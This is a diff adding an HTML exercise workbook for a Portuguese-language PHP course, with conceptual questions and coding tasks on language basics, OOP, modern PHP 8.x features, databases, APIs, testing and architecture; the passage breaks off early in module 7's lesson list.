@@ -1,0 +1,786 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Dominando o PHP · Caderno de Exercícios</title>
+<link rel="stylesheet" href="../caderno.css">
+</head>
+<body class="caderno exercicios">
+<header class="capa">
+<p class="serie">DOMINANDO O PHP</p>
+<h1>Caderno de Exercícios</h1>
+<p class="subtitulo">52 aulas de prática, do #01 ao #52</p>
+<p class="subtitulo">PHP 8.5 · Composer · 10 módulos · 71 questões · 2 desafios integradores</p>
+<p class="autoria">Autor Desconhecido · <a href="https://theknowledgeisle.com/">theknowledgeisle.com</a></p>
+</header>
+<div class="ficha"><span>Nome do aluno:</span><span>Início:</span><span>Término:</span></div>
+<aside class="nota">
+<p><strong>Como usar este caderno</strong></p>
+<p>Cada módulo reúne um bloco de aulas do curso, com a lista dos artigos que ele cobre. As perguntas conceituais pedem explicações com as suas palavras; os exercícios de código pedem programas: escreva, compile e execute cada um.</p>
+<p>Tente sempre resolver sozinho antes de abrir o <strong>Caderno de Respostas</strong>. É no erro que o conhecimento fixa.</p>
+</aside>
+<h2 class="sumario-titulo">Sumário</h2>
+<table class="sumario">
+<thead><tr><th>Módulo</th><th>Tema</th><th>Aulas</th><th>Questões</th></tr></thead>
+<tbody>
+<tr><td>MÓDULO 1</td><td>Fundamentos da linguagem</td><td>#01–#10</td><td>Q1–Q12</td></tr>
+<tr><td>MÓDULO 2</td><td>Orientação a objetos e padrões de projeto</td><td>#11–#15</td><td>Q13–Q20</td></tr>
+<tr><td>MÓDULO 3</td><td>PHP moderno: exceções, interfaces e traits avançados e o PHP 8.x</td><td>#16–#19</td><td>Q21–Q27</td></tr>
+<tr><td>MÓDULO 4</td><td>Banco de dados, APIs e testes</td><td>#20–#25</td><td>Q28–Q37</td></tr>
+<tr><td>MÓDULO 5</td><td>Arquitetura e escala</td><td>#26–#30</td><td>Q38–Q44</td></tr>
+<tr><td>MÓDULO 6</td><td>Outros bancos: PostgreSQL, SQLite e MongoDB</td><td>#31–#33</td><td>Q45–Q49</td></tr>
+<tr><td>MÓDULO 7</td><td>A web: formulários, sessões e segurança</td><td>#34–#40</td><td>Q50–Q56</td></tr>
+<tr><td>MÓDULO 8</td><td>Laravel</td><td>#41–#45</td><td>Q57–Q61</td></tr>
+<tr><td>MÓDULO 9</td><td>Segurança avançada, testes e produção</td><td>#46–#49</td><td>Q62–Q68</td></tr>
+<tr><td>MÓDULO 10</td><td>Projeto final</td><td>#50–#52</td><td>Q69–Q71</td></tr>
+<tr><td>DESAFIOS</td><td>Desafios integradores</td><td>todas</td><td>D1–D2</td></tr>
+</tbody>
+</table>
+<aside class="legenda">
+<p>Legenda: nas perguntas, <code>assim</code> indica código, nomes de tipos e comandos. As linhas pautadas são para a sua resposta; nos exercícios de código, use também o computador: <strong>todo programa deve ser compilado e executado</strong>.</p>
+</aside>
+<section class="modulo" id="modulo-1">
+<h2><span class="rotulo">MÓDULO 1</span> Fundamentos da linguagem</h2>
+<p class="intro">O que é o PHP e de onde veio, o ambiente, variáveis e tipos, decisões, laços, funções, arrays, strings e o tratamento de erros.</p>
+<p class="aulas-titulo">Artigos 01 a 10</p>
+<ul class="aulas">
+<li><span class="n">#01</span> O que é PHP e por que ele ainda importa</li>
+<li><span class="n">#02</span> A História do PHP: de script pessoal a pilar da web</li>
+<li><span class="n">#03</span> Configurando o Ambiente de Desenvolvimento</li>
+<li><span class="n">#04</span> Variáveis, Tipos de Dados e Operadores</li>
+<li><span class="n">#05</span> Estruturas de Controle</li>
+<li><span class="n">#06</span> Estruturas de Repetição</li>
+<li><span class="n">#07</span> Funções</li>
+<li><span class="n">#08</span> Arrays em Profundidade</li>
+<li><span class="n">#09</span> Strings em Profundidade</li>
+<li><span class="n">#10</span> Tratamento de Erros e Exceções</li>
+</ul>
+<h3>Perguntas conceituais</h3>
+<div class="questao" id="q1">
+<span class="num">Q1</span>
+<div class="corpo">
+<p class="titulo">O ciclo de uma requisição</p>
+<p>Descreva o que acontece entre o navegador pedir <code>/produtos.php</code> e receber o HTML. Por que se diz que o PHP tem um modelo "<em>shared nothing</em>", e que consequência isso tem para variáveis globais?</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q2">
+<span class="num">Q2</span>
+<div class="corpo">
+<p class="titulo">Comparação fraca e estrita</p>
+<p>Qual o resultado de cada comparação no PHP 8, e por que o <code>===</code> é o padrão recomendado? <code>0 == "a"</code>, <code>"1" == "01"</code>, <code>"abc" == 0</code>, <code>null == false</code>, <code>"1e3" == "1000"</code>.</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q3">
+<span class="num">Q3</span>
+<div class="corpo">
+<p class="titulo">declare(strict_types=1)</p>
+<p>O que muda num arquivo com <code>declare(strict_types=1);</code> na chamada <code>somar("5", 3)</code> de uma função <code>function somar(int $a, int $b): int</code>? O efeito vale para o arquivo onde a função foi declarada ou onde foi chamada?</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q4">
+<span class="num">Q4</span>
+<div class="corpo">
+<p class="titulo">Arrays: lista ou mapa</p>
+<p>O <code>array</code> do PHP serve de lista, mapa, pilha e fila. O que <code>array_is_list()</code> verifica, e por que <code>unset($lista[1])</code> seguido de <code>json_encode($lista)</code> costuma surpreender?</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q5">
+<span class="num">Q5</span>
+<div class="corpo">
+<p class="titulo">strlen ou mb_strlen</p>
+<p>Por que <code>strlen("ação")</code> devolve 6, e <code>mb_strlen("ação")</code> devolve 4? Que outras funções têm a mesma armadilha?</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q6">
+<span class="num">Q6</span>
+<div class="corpo">
+<p class="titulo">Exception, Error e Throwable</p>
+<p>No PHP 8, qual a diferença entre <code>Exception</code> e <code>Error</code>? Por que <code>catch (Exception $e)</code> não captura uma divisão por zero ou um <code>TypeError</code>?</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<h3>Exercícios de código</h3>
+<div class="questao" id="q7">
+<span class="num">Q7</span>
+<div class="corpo">
+<p class="titulo">Tabela de tipos</p>
+<p>Escreva um programa que percorra os valores <code>0</code>, <code>"0"</code>, <code>""</code>, <code>"0.0"</code>, <code>[]</code>, <code>null</code>, <code>"false"</code> e <code>0.0</code> e mostre, para cada um, o tipo (<code>get_debug_type</code>), se é "verdadeiro" num <code>if</code> e se <code>empty()</code> o considera vazio. Qual deles surpreende?</p>
+</div>
+</div>
+<div class="linhas" style="--n:12"></div>
+<div class="questao" id="q8">
+<span class="num">Q8</span>
+<div class="corpo">
+<p class="titulo">match no lugar de switch</p>
+<p>Reescreva com <code>match</code> uma função que classifica o código HTTP: 200 a 299 "sucesso", 301, 302 e 307 "redirecionamento", 404 "não encontrado", 400 a 499 "erro do cliente", 500 a 599 "erro do servidor". Mostre o que acontece com o código 99.</p>
+</div>
+</div>
+<div class="linhas" style="--n:12"></div>
+<div class="questao" id="q9">
+<span class="num">Q9</span>
+<div class="corpo">
+<p class="titulo">Funções com tipos, padrões e argumentos nomeados</p>
+<p>Escreva <code>function formatarPreco(float $valor, string $moeda = "R$", int $casas = 2, bool $milhar = true): string</code> com <code>number_format</code> no padrão brasileiro. Chame-a com argumentos nomeados, pulando parâmetros. Depois escreva uma função variádica <code>somarTodos(int ...$numeros): int</code> e chame-a espalhando um array.</p>
+</div>
+</div>
+<div class="linhas" style="--n:12"></div>
+<div class="questao" id="q10">
+<span class="num">Q10</span>
+<div class="corpo">
+<p class="titulo">Manipulando arrays sem laços</p>
+<p>Dado um array de pedidos (<code>cliente</code>, <code>valor</code>, <code>status</code>), use <code>array_filter</code>, <code>array_map</code>, <code>array_column</code>, <code>array_sum</code> e <code>usort</code> para: (a) os pedidos pagos; (b) o total pago; (c) os nomes dos clientes com pedido pago, sem repetição e em ordem alfabética; (d) os pedidos ordenados por valor decrescente. Use o operador pipe <code>|&gt;</code> do PHP 8.5 em um dos casos.</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q11">
+<span class="num">Q11</span>
+<div class="corpo">
+<p class="titulo">Strings com acentos</p>
+<p>Escreva <code>function slug(string $texto): string</code> que transforme "Ação &amp; Reação: o Básico do PHP!" em <code>acao-reacao-o-basico-do-php</code>, removendo acentos com <code>iconv</code> ou com a extensão <code>intl</code>, trocando o que não é letra ou dígito por hífen e eliminando hífens repetidos e nas pontas. Mostre também a diferença entre <code>strtoupper</code> e <code>mb_strtoupper</code> no mesmo texto.</p>
+</div>
+</div>
+<div class="linhas" style="--n:12"></div>
+<div class="questao" id="q12">
+<span class="num">Q12</span>
+<div class="corpo">
+<p class="titulo">Exceções em camadas</p>
+<p>Escreva uma função <code>lerConfiguracao(string $arquivo): array</code> que lance uma exceção própria <code>ConfiguracaoException</code> quando o arquivo não existe ou o JSON é inválido, encadeando a exceção original (<code>previous</code>). Use <code>json_decode</code> com <code>JSON_THROW_ON_ERROR</code>. No código que chama, mostre a mensagem e a causa, e use <code>finally</code>.</p>
+</div>
+</div>
+<div class="linhas" style="--n:12"></div>
+</section>
+<section class="modulo" id="modulo-2">
+<h2><span class="rotulo">MÓDULO 2</span> Orientação a objetos e padrões de projeto</h2>
+<p class="intro">Classes e objetos, herança, interfaces e traits, namespaces, PSR-4 e Composer, e os padrões Singleton, Factory, Builder, Observer, Decorator e Strategy.</p>
+<p class="aulas-titulo">Artigos 11 a 15</p>
+<ul class="aulas">
+<li><span class="n">#11</span> Orientação a Objetos: Fundamentos</li>
+<li><span class="n">#12</span> Herança, Interfaces e Traits</li>
+<li><span class="n">#13</span> Namespaces, Autoloading, PSR-4 e Composer</li>
+<li><span class="n">#14</span> Design Patterns: Singleton, Factory e Builder</li>
+<li><span class="n">#15</span> Observer, Decorator e Strategy</li>
+</ul>
+<h3>Perguntas conceituais</h3>
+<div class="questao" id="q13">
+<span class="num">Q13</span>
+<div class="corpo">
+<p class="titulo">Visibilidade e encapsulamento</p>
+<p>Qual a diferença entre <code>public</code>, <code>protected</code> e <code>private</code>? Por que expor uma propriedade <code>public float $saldo</code> numa classe <code>Conta</code> é um problema, e como o PHP 8.4 resolve isso com visibilidade assimétrica?</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q14">
+<span class="num">Q14</span>
+<div class="corpo">
+<p class="titulo">Herança, interface ou trait</p>
+<p>Para cada caso, escolha entre herança, interface e trait: (a) várias classes de pagamento (Pix, cartão, boleto) que precisam de um método <code>pagar()</code>, com implementações totalmente diferentes; (b) as classes <code>Produto</code>, <code>Pedido</code> e <code>Cliente</code>, que precisam dos mesmos métodos <code>criadoEm()</code> e <code>atualizadoEm()</code> com o mesmo código; (c) <code>Administrador</code>, que é um <code>Usuario</code> com permissões a mais.</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q15">
+<span class="num">Q15</span>
+<div class="corpo">
+<p class="titulo">O que o Composer resolve</p>
+<p>O que fazem o <code>composer.json</code>, o <code>composer.lock</code> e o <code>vendor/autoload.php</code>? Por que o <code>composer.lock</code> vai para o repositório de uma aplicação, e o <code>vendor/</code> não?</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q16">
+<span class="num">Q16</span>
+<div class="corpo">
+<p class="titulo">Singleton: quando não usar</p>
+<p>O Singleton garante uma única instância de uma classe, como a conexão com o banco. Por que ele é considerado um antipadrão na maioria dos casos, e qual a alternativa?</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<h3>Exercícios de código</h3>
+<div class="questao" id="q17">
+<span class="num">Q17</span>
+<div class="corpo">
+<p class="titulo">Uma conta com regras</p>
+<p>Escreva <code>final class Conta</code> com o titular, o saldo (<code>public private(set)</code>, PHP 8.4) e os métodos <code>depositar</code> e <code>sacar</code>, que recusam valores não positivos e saques acima do saldo com exceções. Trabalhe em centavos (<code>int</code>). Mostre que tentar alterar o saldo de fora causa um <code>Error</code>.</p>
+</div>
+</div>
+<div class="linhas" style="--n:12"></div>
+<div class="questao" id="q18">
+<span class="num">Q18</span>
+<div class="corpo">
+<p class="titulo">Interfaces e um padrão Strategy</p>
+<p>Defina <code>interface CalculoFrete { public function calcular(float $pesoKg, string $uf): float; }</code> e três estratégias: <code>FreteFixo</code>, <code>FretePorPeso</code> (R$ 5 por kg, mínimo R$ 12) e <code>FreteGratisAcimaDe</code> (um <em>decorator</em> que recebe outra estratégia e zera o frete quando o valor do pedido passa de um limite). Calcule o frete de dois pedidos com cada uma.</p>
+</div>
+</div>
+<div class="linhas" style="--n:12"></div>
+<div class="questao" id="q19">
+<span class="num">Q19</span>
+<div class="corpo">
+<p class="titulo">Uma trait de timestamps</p>
+<p>Escreva a trait <code>TemTimestamps</code>, com as propriedades <code>criadoEm</code> e <code>atualizadoEm</code> (<code>DateTimeImmutable</code>) e os métodos <code>marcarCriacao()</code> e <code>tocar()</code>, e use-a em <code>Produto</code> e <code>Cliente</code>. Use um relógio fixo (uma função que devolve sempre a mesma data) para que a saída seja previsível.</p>
+</div>
+</div>
+<div class="linhas" style="--n:12"></div>
+<div class="questao" id="q20">
+<span class="num">Q20</span>
+<div class="corpo">
+<p class="titulo">Autoload PSR-4 sem Composer</p>
+<p>Para entender o que o Composer faz, escreva um <em>autoloader</em> PSR-4 com <code>spl_autoload_register</code> que mapeie o <em>namespace</em> <code>Livraria\</code> para a pasta <code>src/</code>. Crie, a partir do próprio programa, as classes <code>Livraria\Dominio\Livro</code> e <code>Livraria\Servicos\Catalogo</code> em arquivos separados, e use-as sem nenhum <code>require</code> delas.</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+</section>
+<section class="modulo" id="modulo-3">
+<h2><span class="rotulo">MÓDULO 3</span> PHP moderno: exceções, interfaces e traits avançados e o PHP 8.x</h2>
+<p class="intro">Hierarquias de exceções, interfaces da SPL, traits com conflitos e métodos abstratos, e os recursos do PHP 8.0 ao 8.5: enums, readonly, match, property hooks e o pipe.</p>
+<p class="aulas-titulo">Artigos 16 a 19</p>
+<ul class="aulas">
+<li><span class="n">#16</span> Exceções Avançadas</li>
+<li><span class="n">#17</span> Interfaces Avançadas</li>
+<li><span class="n">#18</span> Traits Avançados</li>
+<li><span class="n">#19</span> PHP 8.x Moderno</li>
+</ul>
+<h3>Perguntas conceituais</h3>
+<div class="questao" id="q21">
+<span class="num">Q21</span>
+<div class="corpo">
+<p class="titulo">Enums com comportamento</p>
+<p>O que um <code>enum StatusPedido: string</code> (<em>backed enum</em>) oferece a mais que um conjunto de constantes <code>const PAGO = 'pago'</code>? Para que servem <code>from</code> e <code>tryFrom</code>?</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q22">
+<span class="num">Q22</span>
+<div class="corpo">
+<p class="titulo">readonly e imutabilidade</p>
+<p>O que garante uma propriedade <code>readonly</code>? Por que um objeto <code>readonly</code> que contém um array de objetos ainda pode mudar "por dentro"? O que o PHP 8.5 trouxe para criar cópias alteradas?</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q23">
+<span class="num">Q23</span>
+<div class="corpo">
+<p class="titulo">Property hooks</p>
+<p>O PHP 8.4 trouxe os <em>property hooks</em>. Mostre como uma propriedade <code>public string $email</code> pode normalizar o valor (minúsculas, sem espaços) a cada escrita, sem <em>getter</em> nem <em>setter</em>. Que vantagem isso tem sobre os métodos <code>setEmail()</code>?</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<h3>Exercícios de código</h3>
+<div class="questao" id="q24">
+<span class="num">Q24</span>
+<div class="corpo">
+<p class="titulo">Um enum de status com regras</p>
+<p>Escreva <code>enum StatusPedido: string</code> com os casos <code>Novo</code>, <code>Pago</code>, <code>Enviado</code>, <code>Entregue</code> e <code>Cancelado</code>, o método <code>rotulo()</code> (texto para a tela) e o método <code>podeIrPara(self $novo): bool</code> com as transições permitidas (Novo → Pago ou Cancelado; Pago → Enviado ou Cancelado; Enviado → Entregue). Converta textos vindos de um formulário com <code>tryFrom</code>, incluindo um inválido.</p>
+</div>
+</div>
+<div class="linhas" style="--n:12"></div>
+<div class="questao" id="q25">
+<span class="num">Q25</span>
+<div class="corpo">
+<p class="titulo">Objeto imutável com clone with</p>
+<p>Escreva <code>final readonly class Preco</code> com <code>centavos</code> e <code>moeda</code>, validação no construtor (não negativo, moeda de 3 letras maiúsculas) e os métodos <code>comDesconto(int $percentual): static</code>, usando o <code>clone</code> com propriedades do PHP 8.5, e <code>formatado()</code>. Mostre que o original não muda e que a validação continua valendo.</p>
+</div>
+</div>
+<div class="linhas" style="--n:12"></div>
+<div class="questao" id="q26">
+<span class="num">Q26</span>
+<div class="corpo">
+<p class="titulo">Iteradores e Countable</p>
+<p>Escreva <code>final class Carrinho implements IteratorAggregate, Countable</code> que guarde itens (título e quantidade), possa ser percorrido com <code>foreach</code> por meio de um gerador (<code>yield</code>) e contado com <code>count()</code>. Acrescente um método gerador <code>itensAcimaDe(int $qtd)</code> e mostre que nada é calculado até o <code>foreach</code> pedir.</p>
+</div>
+</div>
+<div class="linhas" style="--n:12"></div>
+<div class="questao" id="q27">
+<span class="num">Q27</span>
+<div class="corpo">
+<p class="titulo">Traits com conflito e método abstrato</p>
+<p>Duas traits, <code>Registravel</code> e <code>Notificavel</code>, têm um método <code>enviar()</code>. Use as duas na classe <code>Pedido</code>, resolvendo o conflito com <code>insteadof</code> e <code>as</code>. Faça uma das traits exigir, por um método abstrato, que a classe tenha <code>identificador(): string</code>.</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+</section>
+<section class="modulo" id="modulo-4">
+<h2><span class="rotulo">MÓDULO 4</span> Banco de dados, APIs e testes</h2>
+<p class="intro">PDO, prepared statements e o padrão Repository, query builder e migrations, Eloquent, APIs REST, autenticação JWT e testes com PHPUnit.</p>
+<p class="aulas-titulo">Artigos 20 a 25</p>
+<ul class="aulas">
+<li><span class="n">#20</span> PDO Avançado, Prepared Statements e Padrão Repository</li>
+<li><span class="n">#21</span> Query Builder e Migrations</li>
+<li><span class="n">#22</span> ORM com Eloquent</li>
+<li><span class="n">#23</span> APIs REST com PHP</li>
+<li><span class="n">#24</span> Autenticação JWT</li>
+<li><span class="n">#25</span> Testes Automatizados com PHPUnit</li>
+</ul>
+<h3>Perguntas conceituais</h3>
+<div class="questao" id="q28">
+<span class="num">Q28</span>
+<div class="corpo">
+<p class="titulo">Prepared statements</p>
+<p>Explique por que um <em>prepared statement</em> impede SQL injection mesmo quando o valor contém aspas. A opção <code>PDO::ATTR_EMULATE_PREPARES</code> muda essa garantia?</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q29">
+<span class="num">Q29</span>
+<div class="corpo">
+<p class="titulo">Repository</p>
+<p>O que o padrão Repository esconde do resto da aplicação? Por que o método <code>LivroRepository::buscarPorAutor(string $autor): array</code> é melhor do que espalhar o SQL pelos controladores?</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q30">
+<span class="num">Q30</span>
+<div class="corpo">
+<p class="titulo">Migrations</p>
+<p>Por que um projeto versiona as mudanças de esquema como <em>migrations</em> numeradas, em vez de manter só um <code>schema.sql</code> atualizado à mão? O que uma tabela de controle registra?</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q31">
+<span class="num">Q31</span>
+<div class="corpo">
+<p class="titulo">Status HTTP de uma API</p>
+<p>Que código HTTP a API da livraria deve devolver em cada caso, e por quê? (a) livro criado; (b) livro removido; (c) JSON malformado no corpo; (d) campos válidos como JSON, mas preço negativo; (e) <em>token</em> ausente; (f) <em>token</em> válido de um usuário sem permissão; (g) livro inexistente.</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q32">
+<span class="num">Q32</span>
+<div class="corpo">
+<p class="titulo">Onde guardar o JWT no navegador</p>
+<p>Uma SPA recebe um JWT após o login. Compare guardá-lo no <code>localStorage</code> e num <em>cookie</em> <code>HttpOnly; Secure; SameSite=Strict</code>, quanto a XSS e CSRF.</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<h3>Exercícios de código</h3>
+<div class="questao" id="q33">
+<span class="num">Q33</span>
+<div class="corpo">
+<p class="titulo">PDO com SQLite e um Repository</p>
+<p>Crie um banco SQLite em memória com a tabela <code>livros</code>, um <code>final readonly class Livro</code> e um <code>LivroRepository</code> com <code>salvar(Livro): int</code> (devolve o id), <code>buscarPorId(int): ?Livro</code> e <code>buscarPorAutor(string): array</code>, usando <em>prepared statements</em> e <code>FETCH_ASSOC</code>. Mostre que um nome de autor com aspas não quebra a consulta.</p>
+</div>
+</div>
+<div class="linhas" style="--n:12"></div>
+<div class="questao" id="q34">
+<span class="num">Q34</span>
+<div class="corpo">
+<p class="titulo">Um executor de migrations</p>
+<p>Escreva um executor de <em>migrations</em> que, dado um array de <em>migrations</em> nomeadas (<code>"001_cria_livros" =&gt; "CREATE TABLE ..."</code>), crie a tabela de controle se não existir, aplique <strong>só as pendentes</strong>, em ordem, cada uma numa transação, e registre o nome e a data. Rode-o duas vezes e mostre que a segunda não faz nada. Depois inclua uma <em>migration</em> com erro e mostre que ela não deixa o banco pela metade.</p>
+</div>
+</div>
+<div class="linhas" style="--n:12"></div>
+<div class="questao" id="q35">
+<span class="num">Q35</span>
+<div class="corpo">
+<p class="titulo">Uma API REST com o servidor embutido</p>
+<p>Escreva <code>api.php</code>, um roteador para o servidor embutido do PHP (<code>php -S</code>) com <code>GET /livros</code>, <code>GET /livros/{id}</code> (404 quando não existe) e <code>POST /livros</code> (201 com <code>Location</code>, ou 422 com os erros de validação, ou 400 para JSON malformado), guardando os livros num arquivo JSON. Teste com <code>curl</code>.</p>
+</div>
+</div>
+<div class="linhas" style="--n:12"></div>
+<div class="questao" id="q36">
+<span class="num">Q36</span>
+<div class="corpo">
+<p class="titulo">JWT feito à mão</p>
+<p>Para entender o formato, implemente <code>jwt_criar(array $claims, string $segredo): string</code> e <code>jwt_validar(string $token, string $segredo, int $agora): array</code> com HS256, usando <code>hash_hmac</code> e Base64Url. A validação deve recusar assinatura inválida, <em>token</em> expirado (<code>exp</code>) e algoritmo diferente de HS256. Teste um <em>token</em> válido, um alterado e um expirado. (Em produção, use uma biblioteca como <code>firebase/php-jwt</code>.)</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q37">
+<span class="num">Q37</span>
+<div class="corpo">
+<p class="titulo">Testes com PHPUnit</p>
+<p>Escreva, como projeto com Composer e PHPUnit 12, testes para a classe <code>Conta</code> do módulo 2: um teste do depósito, um teste que espera a exceção do saque acima do saldo e um teste com <em>data provider</em> (atributo <code>#[DataProvider]</code>) para valores inválidos de depósito.</p>
+</div>
+</div>
+<div class="linhas" style="--n:12"></div>
+</section>
+<section class="modulo" id="modulo-5">
+<h2><span class="rotulo">MÓDULO 5</span> Arquitetura e escala</h2>
+<p class="intro">SOLID na prática, Clean Architecture, Domain-Driven Design, filas e jobs assíncronos e cache com Redis.</p>
+<p class="aulas-titulo">Artigos 26 a 30</p>
+<ul class="aulas">
+<li><span class="n">#26</span> SOLID na Prática</li>
+<li><span class="n">#27</span> Clean Architecture com PHP</li>
+<li><span class="n">#28</span> Domain-Driven Design</li>
+<li><span class="n">#29</span> Filas e Jobs Assíncronos</li>
+<li><span class="n">#30</span> Cache Avançado com Redis</li>
+</ul>
+<h3>Perguntas conceituais</h3>
+<div class="questao" id="q38">
+<span class="num">Q38</span>
+<div class="corpo">
+<p class="titulo">Uma responsabilidade</p>
+<p>Esta classe tem quantas responsabilidades, segundo o princípio da responsabilidade única (SRP)? Como dividi-la?</p>
+<pre class="codigo"><code>class PedidoService {
+    public function finalizar(array $dados) {
+        // valida os dados, calcula o total com desconto e frete,
+        // grava no MySQL, gera o PDF da nota e envia o e-mail
+    }
+}</code></pre>
+</div>
+</div>
+<div class="linhas" style="--n:12"></div>
+<div class="questao" id="q39">
+<span class="num">Q39</span>
+<div class="corpo">
+<p class="titulo">Inversão de dependência</p>
+<p>O princípio da inversão de dependência (o "D" do SOLID) diz que módulos de alto nível não devem depender de módulos de baixo nível, mas de abstrações. Mostre o antes e o depois com um <code>RelatorioDeVendas</code> que hoje faz <code>new MySqlVendas()</code> dentro do construtor.</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q40">
+<span class="num">Q40</span>
+<div class="corpo">
+<p class="titulo">Entidade, objeto de valor e agregado</p>
+<p>No DDD, qual a diferença entre uma <strong>entidade</strong> e um <strong>objeto de valor</strong>? O que é um <strong>agregado</strong>, e por que os itens de um pedido só devem ser alterados por meio do próprio <code>Pedido</code>?</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q41">
+<span class="num">Q41</span>
+<div class="corpo">
+<p class="titulo">Por que uma fila</p>
+<p>Ao finalizar o pedido, a loja precisa gerar a nota fiscal (3 s, num serviço externo) e enviar o e-mail (1 s). Por que fazer isso numa fila, processada por um <em>worker</em>, em vez de durante a requisição? O que é uma <em>dead letter queue</em>?</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q42">
+<span class="num">Q42</span>
+<div class="corpo">
+<p class="titulo">Cache-aside</p>
+<p>Descreva o padrão <em>cache-aside</em> com Redis para a página de um livro. O que acontece quando o preço muda, e por que o TTL é uma rede de segurança e não a estratégia principal?</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<h3>Exercícios de código</h3>
+<div class="questao" id="q43">
+<span class="num">Q43</span>
+<div class="corpo">
+<p class="titulo">Uma fila de jobs com tentativas</p>
+<p>Implemente uma fila de <em>jobs</em> num SQLite em memória (tabela <code>jobs</code> com <code>tipo</code>, <code>dados</code>, <code>tentativas</code>, <code>status</code>) e um <em>worker</em> que processa os pendentes, tentando de novo os que falham até 3 vezes e mandando para <code>falhou</code> (a <em>dead letter</em>) os que esgotam as tentativas. Simule um <em>job</em> que sempre funciona, um que falha uma vez e depois funciona, e um que sempre falha.</p>
+</div>
+</div>
+<div class="linhas" style="--n:12"></div>
+<div class="questao" id="q44">
+<span class="num">Q44</span>
+<div class="corpo">
+<p class="titulo">Cache-aside com interface</p>
+<p>Defina <code>interface Cache { get, set (com TTL), delete }</code>, uma implementação em memória que respeite o TTL com um relógio injetado, e um <code>LivroService</code> que use o padrão <em>cache-aside</em> sobre um repositório que conta as idas ao "banco". Mostre o <em>miss</em>, o <em>hit</em>, a invalidação na alteração de preço e a expiração pelo TTL.</p>
+</div>
+</div>
+<div class="linhas" style="--n:12"></div>
+</section>
+<section class="modulo" id="modulo-6">
+<h2><span class="rotulo">MÓDULO 6</span> Outros bancos: PostgreSQL, SQLite e MongoDB</h2>
+<p class="intro">Os recursos próprios do PostgreSQL, o SQLite como banco de arquivo e o MongoDB com documentos.</p>
+<p class="aulas-titulo">Artigos 31 a 33</p>
+<ul class="aulas">
+<li><span class="n">#31</span> PostgreSQL com PHP</li>
+<li><span class="n">#32</span> SQLite com PHP</li>
+<li><span class="n">#33</span> MongoDB com PHP</li>
+</ul>
+<h3>Perguntas conceituais</h3>
+<div class="questao" id="q45">
+<span class="num">Q45</span>
+<div class="corpo">
+<p class="titulo">O que o PostgreSQL tem a mais</p>
+<p>Cite três recursos do PostgreSQL que o MySQL não tem ou tem de forma limitada, e um caso de uso de cada um numa livraria.</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q46">
+<span class="num">Q46</span>
+<div class="corpo">
+<p class="titulo">Quando o SQLite basta</p>
+<p>O SQLite é "só para testes"? Em que situações ele é a escolha certa em produção, e qual é a principal limitação dele?</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q47">
+<span class="num">Q47</span>
+<div class="corpo">
+<p class="titulo">Modelando no MongoDB</p>
+<p>Para guardar os pedidos da livraria no MongoDB, como fica o documento de um pedido? O que fica embutido e o que fica como referência, e por quê?</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<h3>Exercícios de código</h3>
+<div class="questao" id="q48">
+<span class="num">Q48</span>
+<div class="corpo">
+<p class="titulo">SQLite com transação e UPSERT</p>
+<p>Com o SQLite, crie a tabela <code>estoque(livro_id PRIMARY KEY, qtd)</code> e escreva <code>function darBaixa(PDO $pdo, array $itens): void</code>, que baixa o estoque de vários livros numa transação, recusando a operação inteira se algum ficar negativo. Use um <em>UPSERT</em> (<code>INSERT ... ON CONFLICT DO UPDATE</code>) para a entrada de estoque. Mostre uma baixa que dá certo e uma que é desfeita.</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q49">
+<span class="num">Q49</span>
+<div class="corpo">
+<p class="titulo">Consultas no MongoDB</p>
+<p>Com a biblioteca <code>mongodb/mongodb</code> (instalada pelo Composer, junto com a extensão <code>mongodb</code>), escreva o código que insere três pedidos no formato da pergunta anterior, busca os pedidos pagos de um cliente e calcula, com uma <em>aggregation pipeline</em>, o total vendido por livro, do maior para o menor.</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+</section>
+<section class="modulo" id="modulo-7">
+<h2><span class="rotulo">MÓDULO 7</span> A web: formulários, sessões e segurança</h2>
+<p class="intro">Formulários, sessões e cookies, upload de arquivos, XSS, CSRF e SQL injection, Composer e namespaces, PSRs e boas práticas.</p>
+<p class="aulas-titulo">Artigos 34 a 40</p>
+<ul class="aulas">
+<li><span class="n">#34</span> Formulários HTML e PHP</li>
